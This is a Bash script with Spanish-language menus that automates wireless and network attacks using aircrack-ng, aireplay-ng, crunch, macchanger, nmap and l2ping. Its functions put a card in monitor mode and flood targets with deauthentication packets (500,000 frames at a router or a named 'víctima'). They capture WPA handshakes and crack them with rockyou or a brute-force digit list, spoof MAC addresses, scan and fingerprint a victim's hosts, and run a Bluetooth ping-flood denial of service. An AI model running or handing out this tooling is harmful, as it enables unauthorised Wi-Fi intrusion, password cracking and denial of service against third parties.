#!/bin/bash
source mtsconfig.sh

##############################################################FUNCIONES#########################################################################
function activar_monitor() {
echo "########MONITOR##########"
echo -e "$yellow SEGURO? $nc"
read -p " mts ▷▷▷ " s15
if [ $s15 == y ]
then
sudo airmon-ng check kill
sudo airmon-ng start $interfaz

sleep 1 
mts
else
mtsconfig
fi
}
################################################
function desactivar_monitor() {
echo -e "$yellow SEGURO? $nc"
read -p " mts ▷▷▷ "  s15
if [ $s15 == y ]
then
sudo airmon-ng stop $monitor
sudo service NetworkManager start
sleep 1
mts
else
mts
fi
}
##############################################
function limpiar_aircrack() {
echo "Especifique directorio a limpiar"
read -p " mts ▷▷▷ "  cleann
echo "Borrando archivos y saliendo.."
cd $cleann
sudo rm *.csv
sudo rm *.cap
sudo rm *.netxml
}
##############################################
function actualizar_sistema() {
echo -e " $green UPDATING..####################################################################################### $nc "
sudo apt-get update -y
echo -e " $green UPGRADING..###################################################################################### $nc "
sudo apt-get upgrade -y
echo -e " $green DIST-UPDATING..################################################################################## ############################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################$nc "
sudo apt-get dist-upgrade -y
}

##############################################
function desautenticar() {
sudo airmon-ng check kill
sudo  airmon-ng start $interfaz

airodump-ng $monitor
echo "Desautenticar a :"
echo " 1] Desautentición total"
echo " 2] Cliente"
read deaut

if [ $deaut == 1 ]
then
echo "Especifique BSSID del router"
read -p " mts ▷▷▷ "  macrd
aireplay-ng --deauth 500000 -a $macrd -h aa:aa:aa:aa:aa:aa $monitor
fi
if [ $deaut == 2 ]
then
echo "Especifique MAC de la víctima"
read -p " mts ▷▷▷ "  dvictim
echo "Especifique BSSID del router"
read -p " mts ▷▷▷ "  macr2
aireplay-ng --deauth 500000 -a $macr2 -c $dvictim  $monitor
fi
}
##############################################################

##############################################
function crack_wifi() {
sudo airmon-ng check kill
sudo airmon-ng start $interfaz

sudo airodump-ng $monitor #Se escanean los Ap de alrededor
$editor_de_texto $userr/datos.txt
echo "Ingrese el canal"
read canal
echo "Ingrese la MAC"
read macr
sudo airodump-ng -c $canal --bssid $macr $monitor #Se ven los dispositivos conectados al ap
echo -e "$red Ingrese ESSID para capturar handshake y haga un ataque de desautenticación $nc "
read essid
gnome-terminal --tab
sudo airodump-ng -c $canal --bssid $macr $monitor -w $essid #Se deja en este modo , a espera de capturar el handshake
}

##############################################
function cambiar_mac() {
echo "Dispositivo a cambiar ( eth0 , $interfaz)"
read -p " mts ▷▷▷ "  dispositivo
if [ $dispositivo == '' ]
then
$dispositivo=$interfaz
echo "$dispositivo"
sleep 2
fi
echo " 1)RESET MAC"
echo " 2)NUEVA MAC"
read -p " mts ▷▷▷ "  macelection
if [ $macelection == 1 ]
then 
sudo ifconfig $dispositivo down
sudo macchanger --permanent $dispositivo
sudo ifconfig $dispositivo up
fi
if [ $macelection == 2 ]
then 
echo " 1)Random"
echo " 2)Personalizada"
read -p " mts ▷▷▷ "  custommac
if [ $custommac == 1 ]
then
sudo ifconfig $dispositivo down
sudo macchanger -r $dispositivo
sudo ifconfig $dispositivo up
fi
if [ $custommac == 2 ]
then 
echo "Qué MAC desea"
read -p " mts ▷▷▷ "  macwrite
sudo ifconfig $dispositivo down
sudo macchanger -m $macwrite $dispositivo
sudo ifconfig $dispositivo up
fi
fi
}
###################################################################################################################################
function crear_app() {
echo "
[Desktop Entry]
Name=<Nombre de tu app>
Encoding=UTF-8
Exec=sh -c <Programa a ejecutar en shell>
Icon=<nombre de tu imagen .png>
StartupNotify=false
Terminal=true
Type=Application
Categories=05-password-attacks;05-05-profile;
X-Kali-Package=crunch

" >> /usr/share/applications/$file_desktop.desktop
gedit /usr/share/applications/$file_desktop.desktop
}
##################################################################################################################################
function ataques_wifi(){
echo -e "	$blue 1] Ataque de fuerza bruta con diccionario a wifi	$nc"
echo -e "	$blue 2] Ataque DoS a cliente/s				$nc"
echo -e "	$blue 3] Crunch on the go				$nc"
echo -e "	$red 4] Ver dispositivos conectados a la red		$nc"
echo -e "	$red 5] Escanear puertos abiertos			$nc"
echo -e "	$red 6] Descubrir sistema operativo			$nc"
read -p "	 mts ▷▷▷ "  s12
case $s12 in 
	1)

crack_wifi
echo "Especifique archivo.cap"
read capfile
echo "Ahora especifique la ubicacion del diccionario[/root/Descargas/rockyou.txt ]"
read pathbf
sudo aircrack-ng -w $pathbf $capfile #Se crackea el archivo.cap
echo "Desea limpiar los archivos? [y/n]"
read -p " mts ▷▷▷ "  clear
if [ $clear == y ]
then
limpiar_aircrack
fi
		
;; 
	2) 

desautenticar
;;
	3)  
crack_wifi
echo "ESSID:"
read -p " mts ▷▷▷ "  essidcrunch
 crunch 10 10 9876543210 | aircrack-ng  $userr/$essidcrunch-01.cap -e $essidcrunch -w- 
echo "Desea limpiar los archivos? [y/n]"
read -p " mts ▷▷▷ "  clear
if [ $clear == y ]
then
limpiar_aircrack
fi
;;
	4)

echo "Especifique direccion ip del router(ifconfig > $interfaz > inet)"
sh -c "ifconfig"
read -p " mts ▷▷▷ "  rip
sudo nmap -sP $rip/24
;;
	5)
echo "Especifique direccion ip de la víctima"
read -p " mts ▷▷▷ "  ipnmap
sudo nmap -sS -O -sV -v $ipnmap      
;;
	6)
echo "Especifique dirección del pc"
read -p " mts ▷▷▷ "  victimip
sudo nmap -p 445 --script smb-os-discovery $victimip
;;
	*)
echo -e "$red Entrada invalida: Seleccione un número del 1 al 6 $nc"
sleep 1
mts
;;
esac
}
########################################################################################
function run() {
sudo l2ping -i hci0 -s 600 -f $macblue
}
function btattack() {
echo -e "$blue MAC Víctima : $nc "
read macbt
export macblue=$macbt
run

}
